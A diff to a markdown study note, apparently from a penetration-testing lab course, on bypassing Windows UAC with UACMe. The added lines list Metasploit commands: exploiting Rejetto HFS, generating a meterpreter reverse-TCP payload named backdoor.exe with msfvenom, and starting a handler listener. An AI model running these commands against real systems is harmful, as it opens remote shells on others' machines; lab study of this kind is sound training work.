@@ -161,9 +161,17 @@ Security Risk: Some attacks can bypass UAC, allowing malicious executables to ru
 
 ### Bypassing UAC with UACMe Practical
 
+With UACMe defeat Windows User Account Control by abusing built-in Windows AutoElevate backdoor.
 - `nmap demo.ine.local` --> Port 80/Http is open
 - `service postgresql start && msfconsole`
 - `setg RHOSTS 10.2.22.223`
 - `search rejetto`
 - `use exploit/windows/http/rejetto_hfs_exec`
 - `exploit`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.37.3 LPORT=1234 -f exe > backdoor.exe` generating interpreter payload with msf venom
+- `service postgresql start && msfconsole` In a new tab
+- `use multi/handler`
+- `set payload windows/meterpreter/reverse_tcp`
+- `set LHOST 10.10.37.3`
+- `set LPORT 1234`
+- `run`
